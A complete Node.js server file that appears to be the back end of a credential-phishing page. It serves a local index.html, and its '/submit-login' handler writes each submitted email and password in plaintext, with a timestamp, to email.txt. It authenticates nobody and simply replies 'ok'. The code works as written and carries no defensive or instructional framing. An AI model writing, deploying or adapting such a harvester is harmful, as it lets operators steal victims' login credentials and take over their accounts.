const http = require('http');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');

const server = http.createServer((req, res) => {
    if (req.method === 'GET' && req.url === '/') {
        fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                return res.end('Server error');
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/submit-login') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            const params = querystring.parse(body);
            const email = params.email || 'unknown';
            const password = params.password || 'unknown';
            const timestamp = new Date().toISOString();
            const line = `[${timestamp}] Email: ${email} | Password: ${password}\n`;

            fs.appendFile(path.join(__dirname, 'email.txt'), line, (err) => {
                if (err) {
                    res.writeHead(500, { 'Content-Type': 'application/json' });
                    return res.end(JSON.stringify({ status: 'error' }));
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'ok' }));
            });
        });
        return;
    }

    res.writeHead(404);
    res.end('Not found');
});

server.listen(3000, () => {
    console.log('Server running at http://localhost:3000');
});
